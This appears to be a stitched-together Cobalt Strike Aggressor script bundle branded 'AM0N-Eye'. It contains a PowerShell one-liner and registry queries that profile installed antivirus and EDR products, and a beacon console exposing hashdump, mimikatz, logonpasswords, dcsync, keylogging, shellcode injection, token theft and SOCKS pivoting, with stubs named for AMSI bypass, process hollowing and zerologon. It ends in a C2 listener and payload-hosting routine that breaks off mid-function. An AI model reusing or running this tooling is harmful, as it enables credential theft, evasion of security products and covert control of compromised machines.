#$powershellcmd = "\$av_list = @(\"BitDefender\", \"Kaspersky\", \"McAfee\", \"Norton\", \"Avast\", \"WebRoot\", \"AVG\", \"ESET\", \"Malware\", \"Windows Defender\");\$av_install = Get-ItemProperty HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$av_install1 = Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$regkey = 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\';\$av_loop2 = foreach (\$av1 in \$av_list){foreach (\$key in \$av_install){if (\$key.DisplayName -match \$av1 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key.DisplayName.ToString(), \$key.DisplayVersion.ToString(), \$key.InstallDate.ToString()}}}};\$proc_temp = Get-Process;\$av_loop = foreach (\$av in \$av_list){foreach (\$zz in \$proc_temp){if (\$zz.path -match \$av -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$zz.Id.ToString(), \$zz.Name.Split('\"')[0],  \$zz.Path.ToString()}}}};\$av_loop3 = foreach (\$av2 in \$av_list){foreach (\$key1 in \$av_install1){if (\$key1.DisplayName -match \$av2 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key1.DisplayName.ToString(), \$key1.DisplayVersion.ToString(), \$key1.InstallDate.ToString()}}}};Write-Output \"`nPID|Name|Path`n\";Write-Output \$av_loop;Write-Output \"`nWindows Defender AV Signature Version:\";(Get-ItemProperty -Path \$regkey).ASSignatureVersion;Write-Output \"`nAV Name|Version|Install Date`n\";Write-Output \$av_loop2;Write-Output \$av_loop3";

#AV_Query Command Register
beacon_command_register("AV_Query", "Queries the Registry for AV Installed",
	"Syntax: AV_Query\n" .
	"Checks HKLM hive for All AntiVirus installed");

#AV_Query alias
alias AV_Query {
	
	blog($1, "\cBDetermining what AntiVirus is installed...");
	bpowerpick!($1, $powershellcmd);
	bpause($1, int(30000));
	bpowerpick!($1, "Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Query \"SELECT * FROM AntiVirusProduct\" | select-object displayName,pathToSignedReportingExe,timestamp| fl");
		
}

import java.awt.*; # for borderlayout
import javax.swing.*; # for jpanel
import javax.swing.table.*; #tablerowsorter
import table.*; # generictablemodel
import ui.*; #atable
import javax.swing.JPanel;
import java.awt.GridLayout;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JSpinner;
import javax.swing.JTextPane;
import javax.swing.JButton;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.*;
import javax.swing.BoxLayout;
import javax.swing.JLabel;
import javax.swing.ScrollPaneConstants;
import javax.swing.JTextField;
import java.awt.FlowLayout;
import javax.swing.SpinnerNumberModel;
import javax.swing.JCheckBox;
import java.awt.Font;

# Setup some variables

# Recon reg key names
#@recon = @("ProductName", "CSDVersion", "CurrentVersion", "CurrentBuild", "SystemRoot", "RegisteredOrganization", "Hostname", "Domain", "DhcpNameServer", "DhcpDomain", "SystemManufacturer", "SystemProductName", "LocalAccountTokenFilterPolicy", "LsaCfgFlags");

# AV reg key names
#@mcafee = @("McAfee\\", "McAfeeAgent\\", "APPolicyName", "EPPolicyName", "OASPolicyName");
#@symantec = @("Symantec\\", "Symantec Endpoint Protection\\");
#@windefender = @("DisableRealtimeMonitoring");
#@windefenderatp = @();

# EDR reg nanes
#@carbonblack = @("CarbonBlack\\", "CbDefense\\", "SensorVersion");
#@crowdstrike = @("CrowdStrike\\", "%SYSTEMROOT%\\system32\\drivers\\crowdstrike\\CsDeviceControl.inf", "%SYSTEMROOT%\\system32\\drivers\\crowdstrike\\CsFirmwareAnalysis.inf");
#@cylance = @("Cylance\\", "Cylance0", "Cylance1", "Cylance2");
#@fireeye = @("FireEye\\");
#@sentinelone = @("Sentinel Labs\\", "Sentinel Agent\\", "externalID");

# Add an item the right-click menu

# Register a new beacon command
beacon_command_register("regenum",
	"System, AV, and EDR profiling via registry queries",
	"Use: regenum\n" .
	"Profiles system information, AV, and EDR products using registry queries.");

# Add a command alias also
alias regenum {
	reg_enum($1);
}

# Query some reg!
sub reg_enum {
	local ('$bid $arch');
	$bid = $1;
	$arch = beacon_arch($bid);

	# Windows Info
	breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", $arch);

	# Networking Info
	breg_query($bid, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", $arch);

	# Network Interfaces
	# breg_query($bid, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces", $arch);

	# Hardware Information
	breg_query($bid, "HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS", $arch);

	# Installed Software
	breg_query($bid, "HKLM\\SOFTWARE", $arch);
	breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", $arch);
	
	# UAC Remote Restriction
	breg_queryv($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LocalAccountTokenFilterPolicy", $arch);

	# Windows Defender Credential Guard
	breg_queryv($bid, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa", "LsaCfgFlags", $arch);
	breg_queryv($bid, "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard", "LsaCfgFlags", $arch);

	# Windows Defender
	breg_queryv($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", $arch);

	# Windows Defender ATPD Attack Surface Reduction
	breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Advanced Threat Protection\\Status", $arch);

	# McAfee
	breg_query($bid, "HKLM\\SOFTWARE\\McAfee\\Endpoint\\AV", $arch);

	# Symantec Endpoint Protection
	breg_query($bid, "HKLM\\SOFTWARE\\Symantec", $arch);

	# Cylance
	breg_query($bid, "HKLM\\SOFTWARE\\Cylance\\Desktop", $arch);

	# Carbon Black 
	breg_query($bid, "HKLM\\SOFTWARE\\CbDefense", $arch);

	# CrowdStrike
	breg_query($bid, "HKLM\\SOFTWARE\\CrowdStrike\\InfDb", $arch);

	# Sentinal One
	breg_query($bid, "HKLM\\SOFTWARE\\Sentinel Labs", $arch);
	breg_query($bid, "HKLM\\SOFTWARE\\Sentinel Labs\\Agent", $arch);
}

# Determine the beacon process architecture for reg query commands
sub beacon_arch {
	if (-is64 $1){
		return "x64";
	} else {
		return "x86";
	}
}

# Highlight interesting registry values
# This currently hijacks all beacon output, looking for specific reg key names
# There will almost definitely be some false positives
set BEACON_OUTPUT {
	local('$output $line $keyname $keyval @beacon_lines')

	# Process each line of beacon output
	foreach $line (split("\n", ["$2" trim])) {
		($keyname) = split(" ", $line);

		# Highlight recon values BLUE
		if(iff($keyname in @recon, true, false)) {
			$line = "\cC[+] Recon: \n\cC$line";
		}

		# Highlight AV values YELLOW
		# McAfee
		else if(iff($keyname in @mcafee, true, false)) {
			$line = "\c8[+] McAfee identified: \n\c8$line";
		}
		# Symantec Endpoint Protection
		else if(iff($line in @symantec, true, false)) {
			$line = "\c8[+] Symantec Endpoint Proection identified: \n\c8$line";
		}
		# Windows Defender
		else if(iff($keyname in @windefender, true, false)) {
			$line = "\c8[+] Windows Defender identified: \n\c8$line";
		}
		# Windows Defender ATP
		#TODO
		else if(iff($keyname in @windefenderatp, true, false)) {
			$line = "\c8[+] Windows Defender ATP identified: \n\c8$line";
		}

		# Highlight EDR values RED
		# Carbon Black
		else if(iff($keyname in @carbonblack, true, false)) {
			$line = "\c4[+] Carbon Black identified: \n\c4$line";
		}
		# CrowdStrike
		else if(iff($keyname in @crowdstrike, true, false)) {
			$line = "\c4[+] CrowdStrike identified: \n\c4$line";
		}
		# Cylance
		else if(iff($keyname in @cylance, true, false)) {
			$line = "\c4[+] Cylance identified: \n\c4$line";
		}
		# FireEye
		else if(iff($keyname in @fireeye, true, false)) {
			$line = "\c4[+] FireEye Endpoint Security identified: \n\c4$line";
		}
		# Sentine One
		else if(iff($line in @sentinelone, true, false)) {
			$line = "\c4[+] Sentinel One identified: \n\c4$line";
		}

		push(@beacon_lines, $line);
	}
	foreach $line (@beacon_lines) {
		$output .= "$line\n";
	}
	return $output;
}


#adso;ccji
println(" 
  █████╗ ███╗   ███╗ ██████╗ ███╗   ██╗      ███████╗██╗   ██╗███████╗
 ██╔══██╗████╗ ████║██╔═══██╗████╗  ██║      ██╔════╝╚██╗ ██╔╝██╔════╝
 ███████║██╔████╔██║██║   ██║██╔██╗ ██║█████╗█████╗   ╚████╔╝ █████╗  
 ██╔══██║██║╚██╔╝██║██║   ██║██║╚██╗██║╚════╝██╔══╝    ╚██╔╝  ██╔══╝  
 ██║  ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║      ███████╗   ██║   ███████╗
 ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚══════╝   ╚═╝   ╚══════╝
\c0[\c3*\c0] \c5Server started on \c0127.0.0.1\c5:\c050050
\c0[\c3!\c0] \c5Attack Mode Ativated \c7⚡️⚡️⚡️");
command beacons {
	foreach $session (beacons()) {
		if ($session['alive']) {
			if($session['pbid'] != ''){
			
			
	println("*----------------------------------------------------------------------*");	
println("\c3[+] Session ID:                                     $session['id']
\c3[+] Arch:                                           $session['barch'] ) ⛓
\c3[+] User:                                           $session['user'] @ $session['computer'] 
\c3[+] Executable Process:                             $session['process'] 
\c3[+] PID:                                            $session['pid']  
\c3[+] Last:                                           $session['lastf'] 
\c3[+] Listener:                                       $session['listener']");
       println("*----------------------------------------------------------------------*");
							
				
			}else{
	println("*----------------------------------------------------------------------*");	
println("\c3[+] Session ID:                                     $session['id']
\c3[+] Arch:                                           $session['barch']  
\c3[+] User:                                           $session['user'] @ $session['computer'] 
\c3[+] Executable Process:                             $session['process'] 
\c3[+] PID:                                            $session['pid']  
\c3[+] Last:                                           $session['lastf'] 
\c3[+] Listener:                                       $session['listener']");
       println("*----------------------------------------------------------------------*");
			}

		}
	}

	println("\n");
}

command use{
	@beaconids = beacon_ids();
	if($1 in @beaconids){
		println("[+] executableing with beacon $1");
		$current = $1
	}else{
		println("[!] Not a valid beacon id");
	}

}


command show_beacon_downloads{

		println("[!] Please execute beacons first");
	
}


command search_all_beacon_downloads{

		println("[!] Please execute beacons first");
	
}


command sync_all_beacon_downloads{

		println("[!] Please execute beacons first");
	
}


command amsi-inject{

		println("[!] Please execute beacons first");
	
}


command sync_beacon_downloads{

		println("[!] Please execute beacons first");
	
}



command etw{

		println("[!] Please execute beacons first");
	
}



command curl{

		println("[!] Please execute beacons first");
	
}


command info_RTFM{

		println("[!] Please execute beacons first");
	
}





command info_WMIC{

		println("[!] Please execute beacons first");
	
}


command info_XP{

		println("[!] Please execute beacons first");
	
}



command info_Advanced{

		println("[!] Please execute beacons first");
	
}


command info_Powerpick{

		println("[!] Please execute beacons first");
	
}


command info_Powershell{

		println("[!] Please execute beacons first");
	
}


command process-hollowing{

		println("[!] Please execute beacons first");
	
}




command AV_Query{

		println("[!] Please execute beacons first");
	
}


command FindProcHandle{

		println("[!] Please execute beacons first");
	
}


command FindModule{

		println("[!] Please execute beacons first");
	
}

command cThreadHijack{

		println("[!] Please execute beacons first");
	
}


command sec-inject{

		println("[!] Please execute beacons first");
	
}



command sec-shinject{

		println("[!] Please execute beacons first");
	
}

command static_syscalls_apc_spawn{

		println("[!] Please execute beacons first");
	
}

command static_syscalls_dump{

		println("[!] Please execute beacons first");
	
}


command static_syscalls_shinject{

		println("[!] Please execute beacons first");
	
}


command enumerate{

		println("[!] Please execute beacons first");
	
}


command static_syscalls_inject{

		println("[!] Please execute beacons first");
	
}

command syscalls_shinject{

		println("[!] Please execute beacons first");
	
}


command syscalls_inject{

		println("[!] Please execute beacons first");
	
}


command hello{

		println("[!] Please execute beacons first");
	
}

command helloWorld{

		println("[!] Please execute beacons first");
	
}

command unhook{

		println("[!] Please execute beacons first");
	
}



command zerologon{

		println("[!] Please execute beacons first");
	
}



command remove{
	beacon_remove($current);
	println("Removed $current");
}



command getuid{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bgetuid($current);
	}
}


command getsystem{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bgetsystem($current);
	}
}

command execute{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bexecute($current,$1);
	}
}

command execute-assembly{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bexecute_assembly($current,$1,$2);
	}
}

command jump{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bjump($current,$1,$2,$3);
	}
}


command clear{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bclear($current);
	}
}

command download{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bdownload($current,$1);
	}
}

command downloads{
	printAll(downloads());

}

command sync_download{
	local('$download $lpath $name $count');
	foreach $count => $download (downloads()) {
		($lpath, $name) = values($download, @("lpath", "name"));
	
		sync_download($lpath, script_resource("$name"), lambda({ 
			println("Downloaded $1 [ $+ $name $+ ]"); 
		}, \$name));
	}
}

command inject{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		binject($current,$1,$2,$3);
	}
}

command spawn{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if(!$2){
			$2 = 'x64';
		}
		bspawn($current,$1,$2);
	}
}

command shspawn{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if(!$1){
			$1 = 'x64';
		}
		bshspawn($current,$1,$2);
	}
}

command inject{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if(!$3){
			$3 = 'x64';
		}
		binject($current,$1,$2);
	}
}

command shinject{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if(!$2){
			$2 = 'x64';
		}
		binjectsh($current,$1,$2,$3);
	}
}

command keylogger{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if(!$2){
			$2 = 'x64';
		}
		if(!$1){
			$1 = binfo($current,'pid');
		}
		bkeylogger($current,$1,$2);
	}
}

command keystrokes{
	@keystrokearray = keystrokes();

	printAll(keystrokes());
	

}

command drives{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bdrives($current);
	}
}

command upload{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bupload($current,$1);
	}
}

command pwd{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpwd($current);
	}
}


command rm{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		brm($current,$1);
	}
}


command shell{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bshell($current,$1);
	}
}

command run{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		brun($current,$1);
	}
}

command runu{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		brunu($current,$1,$2);
	}
}

command powershell{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpowershell($current,$1);
	}
}

command powershell_import{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpowershell_import($current,$1);
	}
}

command powershell_import_clear{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpowershell_import_clear($current,$1);
	}
}

command powerpick{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpowerpick($current,$1);
	}
}

command powerpick_inject{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bpsinject($current,$1,$2,$3);
	}
}

command screenshot{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bscreenshot($current);
	}
}

command screenwatch{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bscreenwatch($current);
	}
}

command steal_token{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bsteal_token($current,$1);
	}
}

command kill{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if($1 == ''){
			println("Usage: kill [pid]");
		}else{
			bkill($current,$1);
		}
	}
}

command sleep{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bsleep($current,$1,$2);
	}
}

command socks{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bsocks($current,$1);
		println("[+] started SOCKS4a server on: $1");
	}
}

command socks_stop{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bsocks_stop($current,$1);
		println("[+] stopped SOCKS4a servers");
	}
}

command spawnto{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bspawnto($current,$1,$2);
	}
}

command info{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		println("Info for beacon " . binfo($current, "id"));
		println("User: " . binfo($current, "user"));
		println("PID: " . binfo($current, "pid"));
		println("Process: " . binfo($current, "process"));
		println("Arch: " . binfo($current, "barch"));
		println("Parent beacon: " . binfo($current, "pbid"));
		if(binfo($current, "note") != ''){
			println("Note: " . binfo($current, "note"));
		}
	}
}


command note{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bnote($current,$1);
	}
}

command ppid{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bppid($current,$1);
	}
}

command rev2self{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		brev2self($current);
	}
}

command remove{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		beacon_remove($current);
		println("Removed $current");
		$current = '';
	}
}

command dcsync{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bdcsync($current,$1,$2);
	}
}

command hashdump{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bhashdump($current);
	}
}

command mimikatz{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bmimikatz($current,$1);
	}
}
command mkdir{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bmkdir($current,$1);
	}
}

command cd{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bcd($current,$1);
	}
}

command mv{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bmv($current,$1,$2);
	}
}

command net{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bnet($current,$1,$2,$3);
	}
}

command ipconfig{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bipconfig($current, {
			println("Network information is:\n $+ $2");
		});
	}
}

command link{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		blink($current,$1,$2);
	}
}

command unlink{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bunlink($current,$1,$2);
	}
}


command make_token{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bloginuser($current,$1,$2,$3);
	}
}

command dir{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		if($1 == ''){
			$1 = '.';
		}
		bls($current,$1);
	}
}

command jobs{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bjobs($current);
	}
	
}

command jobkill{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bjobkill($current,$1);
	}
	
}

command blockdlls{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bblockdlls($current,$1);
	}
	
}

command logonpasswords{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		blogonpasswords($current);
	}
}



command ps{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bps($current);
	}
}

command exit{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		bexit($current);
	}
}

on beacon_output_jobs{
	if($current == ''){
		println("[!] Please execute beacons first");
	}else{
		local('$out $temp $jid $pid $desc');
		$out .= "[*]\o Jobs\n\n";
		$out .= " JID  PID   Description\n";
		$out .= " ---  ---   -----------\n";

		foreach $temp (split("\n", ["$2" trim])) {
			($jid, $pid, $desc) = split("\t", $temp);
			$out .= " $[4]jid $[5]pid $desc $+ \n";
		}

		println($out);
	}
}



on beacon_initial{
	$username = binfo($1,"user");
	$hostname = binfo($1,"computer");
	println("New beacon $1 from $username @ $hostname");
}
on beacon_tasked{
	println("$2");
}

on beacon_error{
	println("$2");
}

on beacon_output{
	println("$2");
}

on beacon_output_alt{
	println("$2");
}

on beacon_checkin{
	println("$2");
}

on beacon_output_ls{
	local('$out @results $cwd $entry $type $size $modified $name');
	@results = split("\n", ["$2" trim]);

	$cwd = left(shift(@results), -1);	# first entry is the current folder

	# parse/process results
	foreach $entry (@results) {
		($type, $size, $modified, $name) = split("\t", $entry);
		if ($type eq "F") {
			$entry = %(type => "fil", size => format_size($size), modified => $modified, name => $name);
		}
		else if ($type eq "D" && $name ne "." && $name ne "..") {
			$entry = %(type => "dir", size => "", modified => $modified, name => $name);
		}
		else {
			remove();
		}
	}

	# sort in alpha order with dir listings on top.
	sort({ return ($1['type'] . lc($1['name'])) cmp ($2['type'] . lc($2['name'])); }, @results);

	$out .= "[*]\o Listing: $cwd $+ \n\n";
	$out .= " Size     Type    Last Modified         Name\n";   
	$out .= " ----     ----    -------------         ----\n";

	foreach $entry (@results) {
		($type, $size, $modified, $name) = values($entry, @('type', 'size', 'modified', 'name'));
		$out .= " $[8]size $[7]type $[21]modified $name $+ \n";
	}

	println($out);
}

#i copy pasted this process list with nice looking tree
#credit @ars3n11 - original code at https://github.com/ars3n11/Aggressor-Scripts/blob/master/ProcessTree.cna
on beacon_output_ps {
	$bd = bdata($1);
	global('@ps @final_ps @reverse_ps @temp_ps');
	local('$outps $temp $name $ppid $pid $arch $user $session');
	$outps .= " PID   PPID  Name                                   Arch  Session     User\n";
	$outps .= " ---   ----  ----                                   ----  -------     ----\n";

	foreach $temp (split("\n", ["$2" trim])) {
		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
			push(@ps, %(pid => $pid, ppid => $ppid, pid_formatted => "$[5]pid", ppid_formatted => "$[5]ppid", color => "", name => $name, arch => "$[5]arch", session => "$[11]session", user => $user));

	}

	# sort the processes please
	sort({ return $1['pid'] <=> $2['pid']; }, @ps);

	# get the @ps array in a reverse order for the ascending child sorting order
	@reverse_ps = reverse(@ps);


	# this function will find all orphan processes and add them to the final_ps. Those will be in the root of the process tree
	sub buildOrphanage{
		for ($counter4 = 0; $counter4 < size($1); $counter4++){
			$orphan = true;

			for ($counter5 = 0; $counter5 < size($1); $counter5++){
				if ($1[$counter4]['ppid'] == $1[$counter5]['pid']){
					$orphan = false;
					break;
				}
			}

			# PID zero - it's gotta be an orphan, poor kid
			if ($1[$counter4]['pid'] == 0){
				$orphan = true;
			}


			if ($orphan == true){
				#set indentation and push to the @final_ps
				$1[$counter4]['indent'] = "";
				push($2, $1[$counter4]);
			}
		}
	}

	# finds an index of a given PID in the array
	sub findArrayElement{
		foreach $index => $value ($1){
			if ($1[$index]['pid'] == $2){
				return $index;
			}
		}
		return $null;
	}

	# adds parent and  all of its children to a temp_ps which then being copied into a final_ps
	sub addChildrenProcesses{		
		# for every parent in the current final_ps
		foreach $parent ($2){

			# check if that parent is already there
			$arrayIndex = findArrayElement($1, $parent['pid']);

			# if the parent is not there - add it first
			if ($arrayIndex == $null){
				#add the parent first 
				push($1, $parent);

				# update arrayIndex for children to follow
				$arrayIndex = size($1) - 1;
			}

			#now find all the children of the process and insert those right under the parent
			foreach $potentialChild ($3){
				if ($potentialChild['ppid'] ==  $parent['pid'] &&  $potentialChild['ppid'] != $potentialChild['pid']){
					$potentialChild['indent'] = $parent['indent'] . "  ";
					add($1, $potentialChild, $arrayIndex + 1);
				}
			}
		}
		# update @final_ps
		$2 = copy($1);
		# clear temp_ps
		clear($1);
	}

	buildOrphanage(@ps, @final_ps);

	# until @final_ps is not going to be the same size as @ps, keep adding children
	# WARNING: if something doesn't work correctly (variable scope??) this will create an infinite loop with AM0N-Eye hanging itself
	while (size(@final_ps) < size(@ps)){
		addChildrenProcesses(@temp_ps, @final_ps, @reverse_ps);
		$final_ps_size = size(@final_ps);
	}


	# in case of an infinite loop, this can be used to debug
	# for ($counter1 = 0; $counter1 < 10; $counter1++){
	# 	addChildrenProcesses(@temp_ps, @final_ps, @reverse_ps);

	# }

	# append to our outstring
	foreach $temp (@final_ps) {
		# for some reason this was the best way to format that string
		$temp_name = $temp['indent'] . $temp['name'];

		$outps .= "$temp['color'] $temp['pid_formatted'] $temp['ppid_formatted'] $[38]temp_name $temp['arch'] $temp['session'] $temp['user']\n";
	}

	# clear these arrays since for some reason they persist after each aggressor script run
	clear(@final_ps);
	clear(@ps);
	
	println("$outps");
}
#menubar("C2Server", "C2Server", 2);



popup C2Server {
    separator();
    menu "&Create C2 Server Listener" {
        item "&Create reverse HTTPS Listener" {
            createC2ServerListener(true);
        }
         item "&Create bind TCP Listener" {
            createC2ServerListener(false);
        }
         item "&C2 Web Delivery" {
        createC2ServerScript();
    } 

    }
   
   
    separator();
}





popup ssh {
    menu "&Explore" {
        item "&File Browser" { 
            local('$bid');
            foreach $bid ($1) {
                openFileBrowser($bid);
            }
        }
        item "&Process List" { openProcessBrowser($1); }
    }
    item "&Spawn" { 
        local('$bid');
        foreach $bid ($1) {
            btask($bid, "[shell]: shell spawn");
            bshell($bid, "spawn");
        }
    }
}

sub random_string {
    # <3 @offsec_ginger
    local('$limit @random_str $characters');
    $limit = $1;
    @random_str = @();
    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for ($x = 0; $x < $limit; $x++) {
        $n = rand(strlen($characters));
        add(@random_str, charAt($characters, $n));
    }
    return join('', @random_str);
}

sub getSystemInfo {
    local('$process $sys_data');
    $process = exec("/usr/bin/uname");
    $sys_data = readAll($process);
    closef($process);
    if (strlen($sys_data) > 0) {
        return 1;
    } else {
        return 0;
    }
}

sub checkSpace {
    local('$realPath');
    $realPath = "";
    if ($1 eq "null") {
        $realPath = $1;
    } else {
        if (getSystemInfo() == 1) {
            $realPath = replace($1, '\p{Space}', "\\\\ ");
        } else {
            $realPath = replace($1, '\p{Space}', "^ ");
        }
        if (find($realPath, '\p{Space}') > 0) {
            $realPath = "'".$realPath."'";
        }
    }
    return $realPath;
}

sub createC2ServerListenerDialogCallBack {
    elog("");
    local('$reverse_https_flag');
    $system = $3['system'];
    $arch = $3['arch'];
    $payload_type = $3['payload_type'];
    $listener = $3['listener'];
    $outputFileName = $3['outputFileName'];
    $beaconKeyPath = $3['beaconKey'];
    $rebind_lib = $3['rebind_lib'];
    $config_ini = $3['config_ini'];
    $processName = $3['processname'];
    $enableSSL = false;
    $enableSSL = $3['enableSSL'];
    $bindPort = $3['bindPort'];
    $domain = localip();
    $host = $domain;
    $port = $bindPort;
    $reverse_https_flag = true;
    $cs_version = $3['cs_version'];

    if ($listener eq "Listener: ") {
        $reverse_https_flag = false;
    }

    if ($config_ini ne "null") {
        $rebind_lib = $rebind_lib.":".$config_ini;
    }

    if ($reverse_https_flag) {
        $listener_info = listener_info($listener);
        $host = $listener_info['host'];
        $port = $listener_info['port'];
        $domain = $listener_info['beacons'];
        $domain = replace($domain, ', ', ',');
    }


    $outputFileName = checkSpace($outputFileName);
    $rebind_lib = checkSpace($rebind_lib);
    $beaconKeyPath = checkSpace($beaconKeyPath);

    if (($reverse_https_flag) && ($payload_type eq "Staged")) {
        $outputFileName = $outputFileName." shellcode";
    }

    $genCC2 = $CC2_PATH . $CC2_BIN;  
    $genCC2 = $genCC2." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
    if (($cs_version eq "4.4") && ($payload_type eq "Stageless")) {
        $genCC2 = $genCC2." stageless 4.4";
    }
    elog($genCC2);
    $process = exec($genCC2);
    $run_res = readAll($process);

    if (getSystemInfo() == 1) {
        elog("genC2Server beacon -> ".$run_res[14]);
    } else {
        elog("genC2Server beacon -> ".$run_res[11]);
    }
    if ($rebind_lib ne 'null') {
        if (getSystemInfo() == 1) {
            elog("rebind protocol -> ".$run_res[16]);
        } else {
            elog("rebind protocol -> ".$run_res[13]);
        }
    }

    $handle = openf($outputFileName);
    $c2Data = readb($handle, -1);
    closef($handle);

    $c2_libData = '';
    if ('-bind' isin $system) {
    } else {
        # create libbeacon data
        $genCC2_lib = $CC2_PATH . $CC2_BIN;  
        $genCC2_lib = $genCC2_lib." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system."-lib ".$arch." ".$outputFileName.".lib";
        if (($cs_version eq "4.4 - source version") && ($payload_type eq "Stageless")) {
            $genCC2_lib = $genCC2_lib." stageless 4.4";
        }
        elog($genCC2_lib);
        $process_lib = exec($genCC2_lib);
        $run_res = readAll($process_lib);
        closef($process_lib);
        $handle_lib = openf($outputFileName.".lib");
        $c2_libData = readb($handle_lib, -1);
        closef($handle_lib);
        if (getSystemInfo() == 1) {
            elog("genC2Server libbeacon -> ".$run_res[14]);
        } else {
            elog("genC2Server libbeacon -> ".$run_res[11]);
        }
        if ($rebind_lib ne 'null') {
            if (getSystemInfo() == 1) {
                elog("rebind protocol -> ".$run_res[16]);
            } else {
                elog("rebind protocol -> ".$run_res[13]);
            }
        }
    }

    $uri = $3['uri'];
    $lport = $3['lport'];

    $targetSaveName = random_string(10);

    # host C2Server beacon
    $listener_name = "";
    if ($reverse_https_flag) {
        $listener_name = "C2Server beacon: reverse-https $system $arch { $listener }";
        # listener中携带了 C2Server beacon
        listener_create_ext("C2Server reverse HTTPS { $listener }{ $system $arch }", "beacon_bind_tcp", %(host => "127.0.0.1", port => 4444, C2ServerBeacon => $c2Data, C2ServerlibBeacon => $c2_libData));
    } else {
        $listener_name = "C2Server beacon: bind-tcp $system $arch";
        # listener中携带了 C2Server beacon
        listener_create_ext("C2Server bind TCP { $system $arch }", "beacon_bind_tcp", %(host => "127.0.0.1", port => $bindPort, C2ServerBeacon => $c2Data));
    }
    if ($enableSSL eq 'true') {
        $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", $listener_name.'[https]', true); 
